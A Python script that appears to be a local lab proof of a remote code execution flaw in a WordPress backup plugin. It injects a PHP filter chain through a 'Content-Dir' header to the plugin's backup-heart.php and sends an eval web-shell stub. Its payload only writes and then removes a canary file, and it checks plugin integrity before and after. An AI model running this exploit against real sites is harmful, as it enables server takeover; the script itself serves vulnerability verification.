"""Independent, benign vendor-endpoint proof. Does not load Framework."""
from pathlib import Path
import base64
import hashlib
import http.client
import http.cookiejar
import json
import socket
import subprocess
import sys
import urllib.parse
import urllib.request

runtime = json.loads(Path(sys.argv[1]).read_text())
out = Path(runtime['directory'])
compose = runtime['compose']
port = runtime['port']
release = runtime['release']
prefix = runtime.get('prefix', '')
wordpress_root = '/var/www/html' + prefix
filter_chain = (Path(__file__).parent / 'native-filter-chain.txt').read_text().strip()
assert hashlib.sha256(filter_chain.encode()).hexdigest() == json.loads((Path(__file__).parent / 'native-filter-provenance.json').read_text())['filter_sha256']
report = {'release': release, 'requests': [], 'cases': [], 'qualification_added': 0}


def save():
    (out / 'native-proof.json').write_text(json.dumps(report, indent=2) + '\n')


def execute(label, code):
    process = subprocess.run(compose + ['exec', '--no-TTY', 'app', 'php', '-r', code], capture_output=True, timeout=30)
    (out / (label + '.stdout')).write_bytes(process.stdout)
    (out / (label + '.stderr')).write_bytes(process.stderr)
    assert process.returncode == 0, (label, process.returncode, process.stderr.decode(errors='replace'))
    return json.loads(process.stdout)



def post(label, headers, body):
    connection = http.client.HTTPConnection('127.0.0.1', port, timeout=15)
    response_body = b''
    record = {'label': label, 'header_bytes': {key: len(value.encode()) for key, value in headers.items()}, 'body_bytes': len(body)}
    try:
        connection.request('POST', prefix + '/wp-content/plugins/backup-backup/includes/backup-heart.php', body=body, headers={'Content-Type': 'application/x-www-form-urlencoded', **headers})
        response = connection.getresponse()
        record.update(status=response.status, headers=response.getheaders())
        try:
            response_body = response.read()
        except http.client.IncompleteRead as error:
            response_body = error.partial
            record['read_error'] = str(error)
    except (socket.timeout, ConnectionError, http.client.HTTPException) as error:
        record['transport_error'] = {'type': type(error).__name__, 'message': str(error)}
    finally:
        connection.close()
    (out / (label + '-http.body')).write_bytes(response_body)
    record['response_sha256'] = hashlib.sha256(response_body).hexdigest()
    record['response_bytes'] = len(response_body)
    report['requests'].append(record)
    save()
    return record


def login(label, password, expected):
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    base = 'http://127.0.0.1:' + str(port) + prefix
    with opener.open(base + '/wp-login.php', timeout=15) as response:
        initial = response.read()
    assert b'wp-submit' in initial
    data = urllib.parse.urlencode({'log': 'module_admin', 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': base + '/wp-admin/profile.php', 'testcookie': '1'}).encode()
    with opener.open(base + '/wp-login.php', data, timeout=15) as response:
        body = response.read()
        login_url = response.url
    with opener.open(base + '/wp-admin/profile.php', timeout=15) as response:
        body = response.read()
        url = response.url
    (out / (label + '.html')).write_bytes(body)
    authenticated = b'id="user_login"' in body and b'value="module_admin"' in body and '/wp-admin/profile.php' in url
    assert authenticated is expected, (label, url)
    report['cases'].append({'case': label, 'authenticated': authenticated, 'login_redirect': login_url, 'profile_url': url, 'cookie_names': sorted(cookie.name for cookie in jar), 'passed': True})
    save()


def integrity(label):
    return execute(label, "define('WP_ADMIN',true);require getcwd().'/wp-load.php';require_once ABSPATH.'wp-admin/includes/plugin.php';$r=getenv('BACKUP_MIGRATION_RELEASE');$c=json_decode(file_get_contents('/opt/module-target/releases.json'),true)[$r];$p='backup-backup/backup-backup.php';$all=get_plugins();foreach($c['installed_sha256'] as $f=>$h){if(!hash_equals($h,hash_file('sha256',WP_PLUGIN_DIR.'/backup-backup/'.$f)))throw new RuntimeException($f);}echo json_encode(['wordpress'=>get_bloginfo('version'),'plugin'=>$all[$p]['Version'],'active'=>is_plugin_active($p),'verified_vendor_files'=>count($c['installed_sha256']),'php'=>PHP_VERSION]);")


try:
    report['before'] = integrity('integrity-before')
    assert report['before']['active'] and report['before']['plugin'] == release and report['before']['verified_vendor_files'] == 315
    login('real-admin-login', 'module-target-password', True)
    login('wrong-password', 'module-target-wrong-password', False)
    for label, key, stub, complete in [
        ('owner-shape-minimal', 'labprobe', "<?php eval($_POST['labprobe']);?>", False),
        ('owner-shape-complete', 'labprobe', "<?php eval($_POST['labprobe']);?>", True),
    ]:
        marker = '/tmp/module-target-backup-native-' + runtime['stamp'] + '-' + label
        expected = ('native-backup-' + release + '-' + label).encode()
        before = execute(label + '-before', '$p=' + json.dumps(marker) + ';echo json_encode(["exists"=>file_exists($p)]);')
        assert not before['exists']
        php = 'file_put_contents(' + json.dumps(marker) + ',base64_decode(' + json.dumps(base64.b64encode(expected).decode()) + '));echo "NATIVE_CANARY_EXECUTED";exit;'
        headers = {'Content-Dir': filter_chain}
        if complete:
            headers.update({'Content-Abs': wordpress_root + '/', 'Content-Content': wordpress_root + '/wp-content/', 'Content-Configdir': '/tmp/', 'Content-Backups': '/tmp/', 'Content-Safelimit': '0'})
        record = post(label, headers, urllib.parse.urlencode({key: php}).encode())
        observed = execute(label + '-after', '$p=' + json.dumps(marker) + ';$s=file_exists($p)?stat($p):false;echo json_encode(["exists"=>(bool)$s,"bytes"=>$s?base64_encode(file_get_contents($p)):null,"uid"=>$s?$s["uid"]:null]);')
        vulnerable = release == '1.3.7'
        passed = (observed['exists'] and observed['bytes'] == base64.b64encode(expected).decode() and observed['uid'] == 33) if vulnerable else not observed['exists']
        report['cases'].append({'case': label, 'expected_execution': vulnerable, 'observed': observed, 'header_bytes': record['header_bytes'], 'passed': passed})
        save()
        execute(label + '-cleanup', '$p=' + json.dumps(marker) + ';if(file_exists($p)&&!unlink($p))throw new RuntimeException("Marker cleanup failed");echo json_encode(["absent"=>!file_exists($p)]);')
        assert passed, (release, label, observed, record)
    report['after'] = integrity('integrity-after')
    assert report['before'] == report['after']
    login('real-admin-login-after', 'module-target-password', True)
    report['native_passed'] = True
except BaseException as error:
    report['failure'] = {'type': type(error).__name__, 'message': str(error)}
    raise
finally:
    save()
